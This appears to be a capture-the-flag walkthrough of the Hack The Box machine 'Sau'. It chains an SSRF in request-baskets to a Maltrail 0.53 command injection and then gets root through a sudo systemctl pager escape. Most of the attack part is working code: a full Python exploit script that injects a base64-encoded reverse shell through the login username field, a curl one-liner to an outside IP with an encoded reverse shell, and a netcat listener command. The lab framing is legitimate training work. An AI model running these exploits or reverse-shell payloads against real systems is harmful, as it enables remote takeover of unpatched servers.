First what we need to do is some recon, turn on the nmap and check what's kind of port is running on the server.
```
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 08 Oct 2023 14:14:58 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 08 Oct 2023 14:14:27 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 08 Oct 2023 14:14:28 GMT
|_    Content-Length: 0
```
We can see SSH and port 55555 unknow, i can't find anything intresting about this port and i decid to do dir search.
```
/@                    (Status: 400) [Size: 75]
/~administrator       (Status: 400) [Size: 75]
/~admin               (Status: 400) [Size: 75]
/~adm                 (Status: 400) [Size: 75]
/~ftp                 (Status: 400) [Size: 75]
/~httpd               (Status: 400) [Size: 75]
/~apache              (Status: 400) [Size: 75]
/~logs                (Status: 400) [Size: 75]
/~amanda              (Status: 400) [Size: 75]
/~bin                 (Status: 400) [Size: 75]
/~log                 (Status: 400) [Size: 75]
/~guest               (Status: 400) [Size: 75]
/~http                (Status: 400) [Size: 75]
/~sys                 (Status: 400) [Size: 75]
/~sysadmin            (Status: 400) [Size: 75]
/~root                (Status: 400) [Size: 75]
/~lp                  (Status: 400) [Size: 75]
/~sysadm              (Status: 400) [Size: 75]
/~nobody              (Status: 400) [Size: 75]
/~mail                (Status: 400) [Size: 75]
/~operator            (Status: 400) [Size: 75]
/~tmp                 (Status: 400) [Size: 75]
/~webmaster           (Status: 400) [Size: 75]
/~test                (Status: 400) [Size: 75]
/~www                 (Status: 400) [Size: 75]
/~user                (Status: 400) [Size: 75]
/baskets              (Status: 401) [Size: 0]
/Documents and Settings (Status: 400) [Size: 75]
/lost+found           (Status: 400) [Size: 75]
/Program Files        (Status: 400) [Size: 75]
/reports list         (Status: 400) [Size: 75]
/web                  (Status: 200) [Size: 8700]
```
Many ports have status 400, but only have 200, let's check what there. We can see there New Basket. and below is the version, let's maybe we will find some quickly vuln, this apllication is vulneability on SSRF, let's it. First what we need to do is Create a basket. 

![obraz](https://github.com/Anogota/Sau/assets/143951834/56a219a4-b2ef-4a34-a35b-77edeee7633b)

Then open Configuration Settings and wrote in Forward URL: ```http://127.0.0.1:80/``` i tested some ports, i read somewhere about this and there was port 8080, but this doesn't work, beacuase i can't see prot 80 i decide to check it, and it work's but rember to tick ```Proxy Response``` with out this u will don't get a SSRF on this port local port.

![obraz](https://github.com/Anogota/Sau/assets/143951834/175e0cc7-2b8f-4e38-a214-7f5104262b08)

And we got access into port 80, this is powered by by Maltrail (v0.53) let's also search something about this vuln. 
I found the code, this help us the get a reverse-shell first what we need to do is turn on the ```nc -lvnp 9001```
```
#!/bin/python3

import sys
import os
import base64

# Arguments to be passed
YOUR_IP = sys.argv[1]  # <your ip>
YOUR_PORT = sys.argv[2]  # <your port>
TARGET_URL = sys.argv[3]  # <target url>

print("\n[+]Started MailTrail version 0.53 Exploit")

# Fail-safe for arguments
if len(sys.argv) != 4:
    print("Usage: python3 mailtrail.py <your ip> <your port> <target url>")
    sys.exit(-1)


# Exploit the vulnerbility
def exploit(my_ip, my_port, target_url):
    # Defining python3 reverse shell payload
    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
    # Encoding the payload with base64 encoding
    encoded_payload = base64.b64encode(payload.encode()).decode()
    # curl command that is to be executed on our system to exploit mailtrail
    command = f"curl '{target_url}/login' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
    # Executing it
    os.system(command)


print("\n[+]Exploiting MailTrail on {}".format(str(TARGET_URL)))
try:
    exploit(YOUR_IP, YOUR_PORT, TARGET_URL)
    print("\n[+] Successfully Exploited")
    print("\n[+] Check your Reverse Shell Listener")
except:
    print("\n[!] An Error has occured. Try again!")
```
Wrote in your terminal ```python3 exploit.py 10.10.16.6 9001 http://10.10.11.224:55555/htb1```
And you got a access, but in lab is secend way to get a reverse-shell
```curl 'http://34.124.197.100:8338/login' \  --data 'username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjU0LjIxMS42NC45NiIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIikn|base64 -d|bash`'```
In this base64 is encode python reverse-shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
Change your IP and PORT and encode this in Base64 also rember to turn on the netcat.
By this curl you can get a reverse shell. Now when you have a user, let's try to get a root, first what you need to do is sudo -l 
```
/usr/bin/systemctl status.trial.service
```
I google it and this what i found.
First you need to insert in reverse-shell 
``` sudo /usr/bin/systemctl status.trial.service ```
Then write !sh and you got the root.
Thank You!
